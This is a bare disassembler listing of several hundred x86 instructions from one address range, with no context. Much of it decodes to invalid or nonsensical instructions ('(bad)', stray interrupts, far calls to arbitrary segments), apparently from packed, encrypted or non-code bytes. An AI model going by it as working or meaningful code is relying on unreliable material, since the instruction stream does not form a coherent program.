  424954:	xchg   ebp,ecx
  424956:	lea    ebx,[ecx*8+0x31cd5c52]
  42495d:	or     dh,BYTE PTR [esi-0x63]
  424960:	jl     0x424968
  424962:	icebp  
  424963:	aam    0x89
  424965:	clc    
  424966:	icebp  
  424967:	sub    edx,edx
  424969:	xchg   DWORD PTR [esi-0x63],esi
  42496c:	in     al,dx
  42496d:	xchg   edx,eax
  42496e:	int    0xd2
  424970:	jo     0x42493f
  424972:	outs   dx,BYTE PTR ds:[esi]
  424973:	test   BYTE PTR [edi+0x63bd70c5],al
  424979:	test   DWORD PTR [eax+0x1c76cd80],eax
  42497f:	int    0x7c
  424981:	mov    BYTE PTR [edx],cl
  424983:	lea    ebx,[ebp-0x32027233]
  424989:	xchg   esi,eax
  42498a:	std    
  42498b:	cmp    ecx,DWORD PTR [edi]
  42498d:	add    al,0xfb
  42498f:	call   ebx
  424991:	jmp    0x424925
  424993:	shr    edx,cl
  424995:	sub    BYTE PTR [ebx+0x13],dl
  424998:	pop    esi
  424999:	lea    ebx,[ebp-0x7232e32c]
  42499f:	mov    BYTE PTR [edi-0x29ffb384],al
  4249a5:	popf   
  4249a6:	int    0x6c
  4249a8:	test   BYTE PTR [ecx-0x79],dh
  4249ab:	lds    esi,FWORD PTR [eax-0x43]
  4249ae:	add    eax,DWORD PTR [edi+0x76cd8080]
  4249b4:	sbb    al,0xcd
  4249b6:	(bad)  
  4249b7:	stc    
  4249b8:	int    0x96
  4249ba:	stc    
  4249bb:	cmp    ecx,DWORD PTR [edi]
  4249bd:	shr    ebx,cl
  4249bf:	xchg   edx,eax
  4249c0:	add    al,0xfb
  4249c2:	inc    DWORD PTR [ebp*2+0x28ead33c]
  4249c9:	push   ebx
  4249ca:	adc    eax,DWORD PTR [ecx-0x69325a73]
  4249d0:	and    al,0xa
  4249d2:	jbe    0x4249f0
  4249d4:	int    0x76
  4249d6:	stc    
  4249d7:	int    0x8d
  4249d9:	stc    
  4249da:	add    al,0x2
  4249dc:	(bad)  
  4249dd:	cmp    edi,DWORD PTR [ecx-0x2d]
  4249e0:	repnz sub bl,dl
  4249e3:	mov    ebp,0xcdd35392
  4249e8:	lea    esp,[edi+ebp*1]
  4249eb:	mov    ebx,0x7d33867e
  4249f0:	pop    esi
  4249f1:	lea    esp,[ebp+0xa4072f]
  4249f7:	add    BYTE PTR [eax],al
  4249f9:	int    0x8
  4249fb:	and    eax,0x43808081
  424a00:	sbb    al,0xd6
  424a02:	cmp    ecx,ebp
  424a04:	lea    edx,[ecx]
  424a06:	int    0x8
  424a08:	adc    DWORD PTR [ecx-0x69307f80],eax
  424a0e:	lods   eax,DWORD PTR ds:[esi]
  424a0f:	(bad)  
  424a10:	int    0x96
  424a12:	adc    DWORD PTR [ebx],edi
  424a14:	(bad)  
  424a16:	sti    
  424a17:	call   ebx
  424a19:	jmp    0x4249ad
  424a1b:	shr    edx,cl
  424a1d:	sub    BYTE PTR [ebx-0x1d],dl
  424a20:	int    0x8d
  424a22:	dec    esp
  424a23:	bound  eax,QWORD PTR [eax]
  424a25:	xchg   ecx,eax
  424a26:	xchg   esp,eax
  424a27:	pop    ebx
  424a28:	add    BYTE PTR [eax+0x24],dh
  424a2b:	push   es
  424a2c:	ins    DWORD PTR es:[edi],dx
  424a2d:	das    
  424a2e:	add    eax,0x808092d9
  424a33:	int    0x96
  424a35:	and    al,0xcd
  424a37:	or     BYTE PTR [ebp-0x327f7f7f],bl
  424a3d:	or     ch,0x7d
  424a40:	cmp    ecx,DWORD PTR [edi]
  424a42:	add    al,0x11
  424a44:	call   ebx
  424a46:	jmp    0x4249da
  424a48:	shr    DWORD PTR [ebp+0x2f7d5328],cl
  424a4e:	add    eax,0x808081da
  424a53:	int    0x76
  424a55:	std    
  424a56:	int    0x8d
  424a58:	std    
  424a59:	cmp    edi,DWORD PTR [ecx+0x4]
  424a5c:	add    bh,bh
  424a5e:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424a64:	push   ebx
  424a65:	ror    DWORD PTR [edx],cl
  424a67:	jbe    0x424a26
  424a69:	pop    ebp
  424a6a:	push   0xcf35869f
  424a6f:	jl     0x424a1e
  424a71:	or     cl,BYTE PTR [ebp+0x658d0a5d]
  424a77:	leave  
  424a78:	jbe    0x424abf
  424a7a:	sbb    BYTE PTR [edi+0x76c93586],bl
  424a80:	shr    al,1
  424a82:	lahf   
  424a83:	xchg   BYTE PTR ds:0xc955760a,dh
  424a89:	jbe    0x424af8
  424a8b:	dec    ecx
  424a8c:	and    DWORD PTR [esi-0x3234c4cb],eax
  424a92:	xchg   esp,eax
  424a93:	iret   
  424a94:	inc    ebp
  424a95:	shl    ebx,cl
  424a97:	xchg   edx,eax
  424a98:	adc    bh,bl
  424a9a:	scas   eax,DWORD PTR es:[edi]
  424a9b:	cmp    DWORD PTR [eax+0x150ab880],eax
  424aa1:	lea    esi,[eax+eax*1+0x0]
  424aa5:	add    BYTE PTR [esi+0x4],ch
  424aa8:	cli    
  424aa9:	xchg   BYTE PTR [edx-0x6047a019],al
  424aaf:	xchg   BYTE PTR ds:0x94060a,dh
  424ab5:	add    BYTE PTR [eax],al
  424ab7:	or     al,BYTE PTR [esi]
  424ab9:	mov    esp,0xa000000
  424abe:	jbe    0x424a70
  424ac0:	or     dh,BYTE PTR [esi+0x15]
  424ac3:	iret   
  424ac4:	outs   dx,BYTE PTR ds:[esi]
  424ac5:	std    
  424ac6:	iret   
  424ac7:	jno    0x424b39
  424ac9:	or     dh,BYTE PTR [esi+0x2d]
  424acc:	or     dh,BYTE PTR [esi+0x35]
  424acf:	leave  
  424ad0:	push   es
  424ad1:	jo     0x424ad3
  424ad3:	add    BYTE PTR [eax],al
  424ad5:	sub    DWORD PTR [edi-0x30f5ca7a],ebx
  424adb:	pushf  
  424adc:	add    BYTE PTR [eax],al
  424ade:	add    BYTE PTR [edx],cl
  424ae0:	pop    ss
  424ae1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ae2:	add    BYTE PTR [eax],al
  424ae4:	add    cl,cl
  424ae6:	push   es
  424ae7:	lods   al,BYTE PTR ds:[esi]
  424ae8:	add    BYTE PTR [eax],al
  424aea:	add    BYTE PTR [edx-0x61],cl
  424aed:	xchg   BYTE PTR ds:0xb406c9,dh
  424af3:	add    BYTE PTR [eax],al
  424af5:	sbb    BYTE PTR [edi+0x6c93586],bl
  424afb:	les    eax,FWORD PTR [eax]
  424afd:	add    BYTE PTR [eax],al
  424aff:	popa   
  424b00:	lahf   
  424b01:	xchg   BYTE PTR ds:0x9006c9,dh
  424b07:	add    BYTE PTR [eax],al
  424b09:	sbb    BYTE PTR [edi+0x6c93586],bl
  424b0f:	aam    0x0
  424b11:	add    BYTE PTR [eax],al
  424b13:	call   0xa77d1b7
  424b18:	iret   
  424b19:	fadd   QWORD PTR [eax]
  424b1b:	add    BYTE PTR [eax],al
  424b1d:	leave  
  424b1e:	push   es
  424b1f:	in     al,0x0
  424b21:	add    BYTE PTR [eax],al
  424b23:	mov    bl,BYTE PTR [edi-0x69f5ca7a]
  424b29:	add    ecx,ecx
  424b2b:	jbe    0x424b32
  424b2d:	and    bl,BYTE PTR [edi-0x72f5ca7a]
  424b33:	or     ecx,ecx
  424b35:	jbe    0x424b03
  424b37:	inc    ecx
  424b38:	lahf   
  424b39:	xchg   BYTE PTR ds:0xc91d8d0a,dh
  424b3f:	jbe    0x424b66
  424b41:	pusha  
  424b42:	lahf   
  424b43:	xchg   BYTE PTR ds:0x493d76c9,dh
  424b49:	and    DWORD PTR [esi-0x3292c4cb],eax
  424b4f:	int3   
  424b50:	push   es
  424b51:	jo     0x424b53
  424b53:	add    BYTE PTR [eax],al
  424b55:	shr    ebx,cl
  424b57:	xchg   edx,eax
  424b58:	add    DWORD PTR [edx],eax
  424b5a:	scas   eax,DWORD PTR es:[edi]
  424b5b:	or     esp,ecx
  424b5d:	test   DWORD PTR [eax+eax*1+0x0],eax
  424b61:	add    BYTE PTR [esp+eax*1-0x7],ch
  424b65:	sbb    al,BYTE PTR [edx+0x1108cdb9]
  424b6b:	add    DWORD PTR [eax+0x74cfcf80],0x71000000
  424b75:	add    BYTE PTR [eax-0x7c],dh
  424b78:	int    0xb3
  424b7a:	adc    DWORD PTR [ecx+0x17cf8080],eax
  424b80:	inc    esp
  424b81:	add    BYTE PTR [eax],al
  424b83:	add    BYTE PTR [edx+0x70],ah
  424b86:	add    BYTE PTR [ecx-0x78],dh
  424b89:	or     dh,BYTE PTR [esi+0x7d]
  424b8c:	iret   
  424b8d:	jbe    0x424b4c
  424b8f:	jo     0x424b5e
  424b91:	or     BYTE PTR ds:0x808081,ah
  424b97:	push   eax
  424b98:	int    0x76
  424b9a:	jge    0x424b9c
  424b9c:	icebp  
  424b9d:	int    0x76
  424b9f:	std    
  424ba0:	int    0x8d
  424ba2:	std    
  424ba3:	cmp    edi,DWORD PTR [ecx+0x4]
  424ba6:	add    bh,bh
  424ba8:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424bae:	push   ebx
  424baf:	ror    DWORD PTR [edx],cl
  424bb1:	jbe    0x424bc0
  424bb3:	int    0x8d
  424bb5:	std    
  424bb6:	int    0x76
  424bb8:	std    
  424bb9:	cmp    ecx,DWORD PTR [edi]
  424bbb:	add    al,0x11
  424bbd:	call   ebx
  424bbf:	lods   eax,DWORD PTR ds:[esi]
  424bc0:	sub    bl,dl
  424bc2:	jmp    0x424b56
  424bc4:	push   ebx
  424bc5:	jge    0x424b94
  424bc7:	jbe    0x424b86
  424bc9:	inc    ebx
  424bca:	rcl    esp,cl
  424bcc:	xchg   esi,eax
  424bcd:	or     dh,BYTE PTR [esi+0x75]
  424bd0:	in     al,dx
  424bd1:	das    
  424bd2:	int    0x80
  424bd4:	int    0x8d
  424bd6:	jne    0x424be2
  424bd8:	jbe    0x424b97
  424bda:	int    0x76
  424bdc:	mov    ebp,0x4dd4d343
  424be1:	int    0x70
  424be3:	sbb    al,0xcd
  424be5:	mov    bl,0x25
  424be7:	add    DWORD PTR [eax-0x29cebc80],0x25b3cdb5
  424bf1:	add    DWORD PTR [eax+0x1c70cd80],0x3ad63143
  424bfb:	int    0xb3
  424bfd:	sub    eax,0xcd808081
  424c02:	xchg   esi,eax
  424c03:	dec    esp
  424c04:	int    0x62
  424c06:	cmp    al,0x87
  424c08:	xor    DWORD PTR [edx],ecx
  424c0a:	jo     0x424c30
  424c0c:	int    0x76
  424c0e:	stc    
  424c0f:	int    0x8d
  424c11:	stc    
  424c12:	cmp    edi,DWORD PTR [ecx+0x4]
  424c15:	add    bh,bh
  424c17:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424c1d:	push   ebx
  424c1e:	ror    DWORD PTR [edx],cl
  424c20:	jbe    0x424c2f
  424c22:	int    0x96
  424c24:	and    al,0x9a
  424c26:	pop    ebx
  424c27:	mov    ebp,0xf5e2
  424c2c:	push   es
  424c2d:	ins    DWORD PTR es:[edi],dx
  424c2e:	das    
  424c2f:	add    eax,0x80808099
  424c34:	add    dh,dl
  424c36:	and    al,0xcd
  424c38:	lock pop ebx
  424c3a:	mov    ebp,0xf52c
  424c3f:	push   es
  424c40:	ins    DWORD PTR es:[edi],dx
  424c41:	das    
  424c42:	add    eax,0x808080c5
  424c47:	int    0x76
  424c49:	and    al,0xcd
  424c4b:	lock int 0xd5
  424c4e:	mov    ebp,0xfbe7
  424c53:	push   es
  424c54:	ins    DWORD PTR es:[edi],dx
  424c55:	das    
  424c56:	add    eax,0x808080d1
  424c5b:	call   0x0:0xf90ebd5b
  424c62:	push   es
  424c63:	ins    DWORD PTR es:[edi],dx
  424c64:	das    
  424c65:	add    eax,0x8080802d
  424c6a:	int    0x8
  424c6c:	and    eax,0x43808081
  424c71:	sbb    al,0xd6
  424c73:	sbb    cl,ch
  424c75:	or     BYTE PTR [ecx],dl
  424c77:	add    DWORD PTR [eax-0x52723080],0xadd60071
  424c81:	int    0x8d
  424c83:	dec    esp
  424c84:	add    BYTE PTR [ecx+0x70005b94],dl
  424c8a:	and    al,0xcd
  424c8c:	or     BYTE PTR [ebp-0x327f7f7f],bl
  424c92:	or     ch,0x7d
  424c95:	cmp    ecx,DWORD PTR [edi]
  424c97:	add    al,0x11
  424c99:	call   ebx
  424c9b:	jmp    0x424c2f
  424c9d:	shr    DWORD PTR [ebp-0x2b82acd8],cl
  424ca3:	(bad)
  424ca7:	dec    ecx
  424ca8:	and    BYTE PTR [esi-0x778932cb],al
  424cae:	int    0x8d
  424cb0:	mov    ch,cl
  424cb2:	jbe    0x424cd8
  424cb4:	shr    ebx,cl
  424cb6:	xchg   edx,eax
  424cb7:	adc    al,BYTE PTR [edx]
  424cb9:	scas   eax,DWORD PTR es:[edi]
  424cba:	cmp    DWORD PTR [eax+0x7c89b880],eax
  424cc0:	sbb    ch,cl
  424cc2:	ins    BYTE PTR es:[edi],dx
  424cc3:	cmp    al,0xcd
  424cc5:	lea    ebp,[edi+eax*4]
  424cc8:	lds    ecx,FWORD PTR [edx]
  424cca:	outs   dx,BYTE PTR ds:[esi]
  424ccb:	adc    al,0xcd
  424ccd:	jbe    0x424cfb
  424ccf:	leave  
  424cd0:	add    BYTE PTR [edi-0x327f7f80],0x76
  424cd7:	sub    al,0xa
  424cd9:	pushf  
  424cda:	test   ch,cl
  424cdc:	jbe    0x424d0e
  424cde:	int    0x8d
  424ce0:	sub    al,0xa
  424ce2:	outs   dx,BYTE PTR ds:[esi]
  424ce3:	mov    ch,cl
  424ce5:	jbe    0x424cfb
  424ce7:	int    0x8d
  424ce9:	sub    al,0xa
  424ceb:	outs   dx,BYTE PTR ds:[esi]
  424cec:	dec    esp
  424ced:	in     al,dx
  424cee:	adc    al,0xcd
  424cf0:	jbe    0x424d16
  424cf2:	int    0x6c
  424cf4:	cmp    al,0xcd
  424cf6:	lea    ebp,[edi+eax*4]
  424cf9:	lds    ecx,FWORD PTR [edx]
  424cfb:	outs   dx,BYTE PTR ds:[esi]
  424cfc:	adc    al,0xcd
  424cfe:	jbe    0x424d2c
  424d00:	add    al,0x2c
  424d02:	or     cl,0x76
  424d05:	icebp  
  424d06:	add    DWORD PTR [eax-0x19fb7f80],0x92d680f1
  424d10:	cmp    ebx,ebp
  424d12:	int    0xc5
  424d14:	arpl   sp,bp
  424d16:	xchg   edx,eax
  424d17:	cmp    ebp,DWORD PTR [ebp-0x56]
  424d1a:	test   al,0xcb
  424d1c:	shl    BYTE PTR [eax+eax*4],cl
  424d1f:	xchg   esi,eax
  424d20:	int    0xed
  424d22:	jno    0x424d95
  424d24:	das    
  424d25:	mov    ebx,0x74cf146e
  424d2a:	mov    BYTE PTR [edi+ebp*1],bl
  424d2d:	mov    ebx,0x9a5b867e
  424d32:	leave  
  424d33:	jbe    0x424d32
  424d35:	dec    ecx
  424d36:	and    DWORD PTR [esi-0x672f5cb],eax
  424d3c:	push   es
  424d3d:	retf   
  424d3e:	aam    0xb4
  424d40:	popa   
  424d41:	shl    DWORD PTR [ecx],1
  424d43:	xchg   BYTE PTR ds:0xcd4c7ccd,dh
  424d49:	out    0x88,al
  424d4b:	xchg   edx,edi
  424d4d:	pop    esi
  424d4e:	out    0x4c,al
  424d50:	or     BYTE PTR [ebp-0x33],0xdc
  424d54:	mov    BYTE PTR [edi-0x77197806],al
  424d5a:	pop    esi
  424d5b:	out    0x4c,al
  424d5d:	cmp    BYTE PTR [edx-0x33],0x8d
  424d61:	std    
  424d62:	int    0xe6
  424d64:	std    
  424d65:	cmp    edx,DWORD PTR [ebx]
  424d67:	add    al,0xf8
  424d69:	call   ebx
  424d6b:	jmp    0xd41e1a98
  424d70:	in     al,dx
  424d71:	xchg   edx,eax
  424d72:	push   ebx
  424d73:	cld    
  424d74:	add    al,0xf2
  424d76:	std    
  424d77:	add    al,0xd3
  424d79:	test   BYTE PTR [ebp*2+0x10d37a3c],al
  424d80:	sub    BYTE PTR [ebx-0x6],dl
  424d83:	adc    bh,al
  424d85:	dec    ecx
  424d86:	and    DWORD PTR [esi-0x2197ecb],eax
  424d8c:	int    0x8d
  424d8e:	std    
  424d8f:	int    0xe6
  424d91:	std    
  424d92:	cmp    edx,DWORD PTR [ebx]
  424d94:	add    al,0xf8
  424d96:	call   ebx
  424d98:	jmp    0x424d2c
  424d9a:	shr    ecx,cl
  424d9c:	sub    BYTE PTR [ebx-0x10],dl
  424d9f:	inc    ebx
  424da0:	(bad)  
  424da1:	stc    
  424da2:	xor    BYTE PTR [ecx+0x63aa6d3b],0xcb
  424da9:	ror    BYTE PTR [eax-0x12326980],cl
  424daf:	add    al,0xed
  424db1:	push   eax
  424db2:	leave  
  424db3:	jbe    0x424d5a
  424db5:	mov    edx,0xc98080ac
  424dba:	jbe    0x424d71
  424dbc:	xchg   eax,ecx
  424dbe:	add    BYTE PTR [eax-0x68528937],0x40
  424dc5:	add    BYTE PTR [eax-0x51068937],0x30
  424dcc:	test   BYTE PTR [eax-0x4a028937],al
  424dd2:	lods   al,BYTE PTR ds:[esi]
  424dd3:	add    BYTE PTR [eax+0x69f176c9],0x53
  424dda:	add    BYTE PTR [eax-0x76a8937],0x42
  424de1:	add    BYTE PTR [eax-0x78628937],0x80
  424de8:	add    BYTE PTR [eax-0x2c428937],0xb8
  424def:	add    BYTE PTR [eax-0x32128937],0x71
  424df6:	add    BYTE PTR [eax-0x1dee8937],0xb6
  424dfd:	add    BYTE PTR [eax+0x5dfd8dcd],0x8b
  424e04:	mov    al,BYTE PTR [eax-0x322ccc80]
  424e0a:	(bad)  
  424e0b:	stc    
  424e0c:	cmp    ebx,edx
  424e0e:	clc    
  424e0f:	add    bl,BYTE PTR [eax+0x127dcd9a]
  424e15:	repnz popa 
  424e17:	and    al,BYTE PTR [eax-0x7a34ed80]
  424e1d:	mov    BYTE PTR [eax+0x42021280],0xa4
  424e24:	add    BYTE PTR [eax+0x3cded312],0x80
  424e2b:	or     cl,0x76
  424e2e:	cmc    
  424e2f:	icebp  
  424e30:	lea    eax,[eax-0x2893680]
  424e36:	jnp    0x424e0c
  424e38:	add    BYTE PTR [eax+0x18f976c9],0x30
  424e3f:	add    BYTE PTR [eax-0x32068933],0x96
  424e46:	std    
  424e47:	ss dec eax
  424e49:	pushf  
  424e4a:	add    BYTE PTR [eax+0x7687d23b],0xf5
  424e51:	int    0xe3
  424e53:	push   esi
  424e54:	jp     0x424e55
  424e56:	add    BYTE PTR [eax-0x69f50ecd],0xfd
  424e5d:	int    0x76
  424e5f:	std    
  424e60:	xchg   DWORD PTR [esi-0x78],esi
  424e63:	int    0x96
  424e65:	std    
  424e66:	xchg   DWORD PTR [esi+0x922ca4c],edx
  424e6c:	xor    ch,cl
  424e6e:	jbe    0x424e81
  424e70:	int    0x96
  424e72:	in     eax,dx
  424e73:	sbb    BYTE PTR ss:[edi-0x80],cl
  424e77:	cmp    BYTE PTR [ebx],0xd2
  424e7a:	int    0x96
  424e7c:	mov    ebp,0xe261d253
  424e81:	fadd   DWORD PTR [eax-0x320ecc80]
  424e87:	jbe    0x424e3e
  424e89:	xchg   DWORD PTR [ebx],edx
  424e8b:	popa   
  424e8c:	fist   WORD PTR [eax+eax*4-0x80]
  424e90:	xor    esi,ecx
  424e92:	xchg   DWORD PTR [esi-0x5a893253],edx
  424e98:	int    0xd6
  424e9a:	xor    ch,cl
  424e9c:	out    0x9d,al
  424e9e:	adc    bh,bl
  424ea0:	mov    DWORD PTR [ecx-0x80],esi
  424ea3:	sub    BYTE PTR [ebx],0xf1
  424ea6:	int    0x76
  424ea8:	xchg   ebp,eax
  424ea9:	adc    bh,bl
  424eab:	mov    dh,0x2c
  424ead:	add    BYTE PTR [eax-0x25c404cd],0xf8
  424eb4:	clc    
  424eb5:	int    0x96
  424eb7:	icebp  
  424eb8:	push   esi
  424eb9:	out    0x1e,al
  424ebb:	add    BYTE PTR [eax-0x1c322dd5],0x33
  424ec2:	icebp  
  424ec3:	adc    dh,bl
  424ec5:	pop    es
  424ec6:	push   edx
  424ec7:	add    BYTE PTR [eax+0x72f9943],0x63
  424ece:	add    BYTE PTR [eax],al
  424ed0:	add    BYTE PTR [edx+0x4cd2cba8],ch
  424ed6:	adc    BYTE PTR [esi-0x12fb1233],0x74
  424edd:	pop    ebx
  424ede:	cwde   
  424edf:	call   0x8043:0xd9ed76c9
  424ee6:	or     cl,0x76
  424ee9:	adc    DWORD PTR [edx+0x7e],esi
  424eec:	add    BYTE PTR [eax+0x5ff576c9],0x71
  424ef3:	add    BYTE PTR [eax+0xbf976c9],0x71
  424efa:	add    BYTE PTR [eax+0x29fd76c9],0x2c
  424f01:	add    BYTE PTR [eax-0x275a8937],0x58
  424f08:	add    BYTE PTR [eax+0x76ad76c9],0x84
  424f0f:	add    BYTE PTR [eax+0x6cb576c9],0x8c
  424f16:	add    BYTE PTR [eax+0x1abd76c9],0x5e
  424f1d:	add    BYTE PTR [eax-0x449a8937],0x6f
  424f24:	add    BYTE PTR [eax+0x4a6d76c9],0x80
  424f2b:	add    BYTE PTR [eax+0x4d7576c9],0x38
  424f32:	add    BYTE PTR [eax+0x1f7d76c9],0x28
  424f39:	add    BYTE PTR [eax-0x44f28937],0x4d
  424f40:	add    BYTE PTR [eax-0x1b0e8937],0x1c
  424f47:	add    BYTE PTR [eax-0x32528933],0x8d
  424f4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f4f:	dec    ebp
  424f50:	bound  ebp,QWORD PTR [ebx]
  424f52:	add    BYTE PTR [eax-0x7f59c2ba],0x80
  424f59:	dec    ebp
  424f5a:	pop    ds
  424f5b:	and    eax,DWORD PTR [eax-0x2c2ed080]
  424f61:	pop    edi
  424f62:	xchg   ecx,eax
  424f63:	mov    bh,0x7e
  424f65:	stc    
  424f66:	xor    edi,DWORD PTR [ebp-0x33]
  424f69:	jbe    0x424f68
  424f6b:	int    0x96
  424f6d:	stc    
  424f6e:	sub    edx,edx
  424f70:	int    0x96
  424f72:	cmc    
  424f73:	dec    ebp
  424f74:	inc    edi
  424f75:	outs   dx,DWORD PTR ds:[esi]
  424f76:	add    BYTE PTR [eax-0x69322dcd],0x11
  424f7d:	xor    edx,edx
  424f7f:	int    0x96
  424f81:	in     eax,dx
  424f82:	push   ebx
  424f83:	sar    BYTE PTR [ebx],cl
  424f85:	fisubr DWORD PTR [ecx-0x27]
  424f88:	ret    
  424f89:	add    BYTE PTR [eax],al
  424f8b:	clc    
  424f8c:	test   ebp,0x72c34c96
  424f92:	push   ds
  424f93:	add    BYTE PTR [eax+0x76cdf133],0xbd
  424f9a:	int    0xd6
  424f9c:	mov    ch,0x33
  424f9e:	leave  
  424f9f:	das    
  424fa0:	sar    DWORD PTR [ecx+0x69],1
  424fa3:	fisttp DWORD PTR [edx]
  424fa5:	xchg   ecx,eax
  424fa6:	mov    ebx,ebp
  424fa8:	popa   
  424fa9:	add    BYTE PTR [eax-0x6a893680],0x9b
  424fb0:	push   esp
  424fb1:	add    BYTE PTR [eax+0x2d9d76c9],0x6f
  424fb8:	add    BYTE PTR [eax+0x1ad76c9],0xa4
  424fbf:	add    BYTE PTR [eax-0x7e5a8937],0x80
  424fc6:	add    BYTE PTR [eax+0x3ba5a6cd],0xda
  424fcd:	pop    ebp
  424fce:	call   0xcdf4:0xf880806f
  424fd5:	xchg   esi,eax
  424fd6:	lods   eax,DWORD PTR ds:[esi]
  424fd7:	int    0xa6
  424fd9:	mov    BYTE PTR [ebx-0x2e],dl
  424fdc:	int    0x96
  424fde:	popf   
  424fdf:	xor    edx,edx
  424fe1:	int    0x96
  424fe3:	xchg   ebp,eax
  424fe4:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  424fe6:	push   eax
  424fe7:	add    BYTE PTR [eax-0x302d2ed1],0x5
  424fee:	mov    BYTE PTR [eax+0x2c],bl
  424ff1:	ret    0xafd
  424ff4:	jbe    0x424f8b
  424ff6:	int    0x76
  424ff8:	icebp  
  424ff9:	int    0x96
  424ffb:	or     eax,0xf3f7f534
  425000:	int    0x96
  425002:	xchg   ebp,eax
  425003:	xor    al,0x23
  425005:	inc    esp
  425006:	test   DWORD PTR [ebp+edx*8-0x7c],ecx
  42500a:	inc    esi
  42500b:	or     DWORD PTR [eax+eiz*1+0x4d7d76cd],eax
  425012:	rol    esi,0x80
  425015:	add    BYTE PTR [edi-0x59328a8a],0x6d
  42501c:	cmp    ebx,edx
  42501e:	clc    
  42501f:	hlt    
  425020:	int    0x96
  425022:	gs mov edi,0xc3d9
  425028:	ss aaa 
  42502a:	push   esi
  42502b:	add    BYTE PTR [eax+0xc56d233],0x6d
  425032:	add    BYTE PTR [eax],al
  425034:	xchg   DWORD PTR [ebp-0x33],edi
  425037:	jbe    0x425036
  425039:	int    0x96
  42503b:	stc    
  42503c:	sub    edx,edx
  42503e:	int    0x96
  425040:	cmc    
  425041:	dec    ebp
  425042:	inc    edi
  425043:	outs   dx,DWORD PTR ds:[esi]
  425044:	add    BYTE PTR [eax-0x69322dcd],0x11
  42504b:	xor    edx,edx
  42504d:	int    0x96
  42504f:	in     eax,dx
  425050:	push   ebx
  425051:	sar    BYTE PTR [ebx],cl
  425053:	(bad)  
  425055:	hlt    
  425056:	int    0x96
  425058:	dec    esp
  425059:	xor    esi,ecx
  42505b:	int    0x76
  42505d:	mov    ebp,0x33b5a6cd
  425062:	leave  
  425063:	das    
  425064:	rol    ebp,1
  425066:	int    0xdb
  425068:	xor    ebx,DWORD PTR [ebp-0x1dbc5679]
  42506e:	das    
  42506f:	pop    es
  425070:	pop    esp
  425071:	add    BYTE PTR [eax],al
  425073:	add    BYTE PTR [edx-0x2d349c58],ch
  425079:	mov    BYTE PTR [eax+0x4edcd96],al
  42507f:	in     eax,dx
  425080:	jo     0x42504b
  425082:	jbe    0x425054
  425084:	xchg   ecx,eax
  425085:	aaa    
  425086:	ficom  WORD PTR [ebx]
  425088:	pop    ebp
  425089:	mov    ebp,0xa25230a
  42508e:	jbe    0x4250e5
  425090:	leave  
  425091:	jbe    0x4250f0
  425093:	mov    esi,0xa13de37
  425098:	jbe    0x4250ff
  42509a:	leave  
  42509b:	jbe    0x42510a
  42509d:	fidiv  WORD PTR [edi]
  42509f:	ficom  WORD PTR [ebx]
  4250a1:	or     dh,BYTE PTR [esi+0x75]
  4250a4:	pop    ebx
  4250a5:	leave  
  4250a6:	jbe    0x425125
  4250a8:	scas   al,BYTE PTR es:[edi]
  4250a9:	aaa    
  4250aa:	ficom  WORD PTR [ebx]
  4250ac:	or     dh,BYTE PTR [esi+0xd]
  4250af:	cwde   
  4250b0:	call   0xde37:0x96f176c9
  4250b7:	adc    ecx,DWORD PTR [edx]
  4250b9:	jbe    0x425050
  4250bb:	cmp    ebx,edx
  4250bd:	cmp    eax,DWORD PTR [eax]
  4250bf:	pop    edi
  4250c0:	dec    ecx
  4250c1:	and    DWORD PTR [esi-0x628936cb],eax
  4250c7:	out    0x37,al
  4250c9:	ficom  WORD PTR [ebx]
  4250cb:	jp     0x4250d7
  4250cd:	jbe    0x425074
  4250cf:	int    0xd3
  4250d1:	or     dl,BYTE PTR [esi-0x4a19f513]
  4250d7:	iret   
  4250d8:	xchg   ecx,eax
  4250d9:	add    DWORD PTR [ecx+edx*1],0x28add3ff
  4250e0:	push   ebx
  4250e1:	ror    bh,cl
  4250e3:	je     0x4250ac
  4250e5:	ror    ch,1
  4250e7:	xor    ch,cl
  4250e9:	pushf  
  4250ea:	test   BYTE PTR [edi],ch
  4250ec:	inc    ebp
  4250ed:	loop   0x425081
  4250ef:	shr    esp,cl
  4250f1:	xchg   edx,eax
  4250f2:	int    0x1c
  4250f4:	int    0x6c
  4250f6:	test   BYTE PTR [ebx],bh
  4250f8:	ins    DWORD PTR es:[edi],dx
  4250f9:	adc    bh,bl
  4250fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4250fc:	mov    esi,0xf1534229
  425101:	or     dl,BYTE PTR [esi-0x6893207]
  425107:	xchg   DWORD PTR [ebp-0x2d],ebp
  42510a:	in     eax,0x28
  42510c:	inc    ebx
  42510d:	jbe    0x42515b
  42510f:	das    
  425110:	or     BYTE PTR [edi-0x327f7f80],bh
  425116:	jbe    0x425111
  425118:	add    al,0xb6
  42511a:	mov    ebp,0x11e60a80
  42511f:	int    0x76
  425121:	stc    
  425122:	push   es
  425123:	ins    DWORD PTR es:[edi],dx
  425124:	aam    0xb6
  425126:	cmp    ebp,DWORD PTR [ebp+0xa]
  425129:	out    0xf5,al
  42512b:	int    0x96
  42512d:	mov    ebp,0xcf88a6cd
  425132:	fs xor ch,cl
  425135:	xchg   esi,eax
  425136:	mov    BYTE PTR [edi-0x5269f527],al
  42513c:	retf   0x922
  42513f:	xchg   esi,eax
  425140:	add    ch,cl
  425142:	xchg   esi,eax
  425143:	stc    
  425144:	xchg   ecx,ebx
  425146:	retf   0x2014
  425149:	int    0xa6
  42514b:	lods   eax,DWORD PTR ds:[esi]
  42514c:	or     DWORD PTR [ebx],ebx
  42514e:	retf   0x96
  425151:	int    0xa6
  425153:	stc    
  425154:	xchg   ecx,esp
  425156:	int    0xe6
  425158:	mov    BYTE PTR [ecx],cl
  42515a:	adc    al,0x43
  42515c:	int    0x96
  42515e:	cmc    
  42515f:	ins    BYTE PTR es:[edi],dx
  425160:	add    al,0xea
  425162:	std    
  425163:	sar    DWORD PTR [ebp-0x7b2dfbd8],cl
  425169:	push   ebx
  42516a:	sar    BYTE PTR [ebx],cl
  42516c:	ror    DWORD PTR [edx],cl
  42516e:	jbe    0x425165
  425170:	push   ecx
  425171:	(bad)  
  425172:	cmc    
  425173:	int    0x96
  425175:	cmc    
  425176:	add    al,0x11
  425178:	call   ebx
  42517a:	repz xchg edx,eax
  42517c:	shr    DWORD PTR [ebp-0x322dacd8],cl
